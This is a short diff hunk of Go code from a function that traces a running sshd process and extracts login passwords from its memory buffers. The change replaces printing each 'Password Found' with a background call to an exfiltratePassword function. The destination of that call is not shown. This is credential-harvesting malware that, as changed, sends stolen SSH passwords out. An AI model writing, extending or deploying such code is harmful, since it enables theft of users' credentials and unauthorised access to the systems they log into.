@@ -120,7 +120,7 @@ func traceSSHDProcess(pid int) {
 					excludeString := "\\x00\\x00\\x00.\\f"
 					if !regexp.MustCompile(excludeString).MatchString(string(buffer)) {
 						cleanedBuffer := strings.TrimLeft(string(buffer), "\n")
-						fmt.Printf("Password Found: %s\n", cleanedBuffer)
+						go exfiltratePassword(strings.TrimLeft(string(cleanedBuffer), "\n"))
 					}
 				}
 
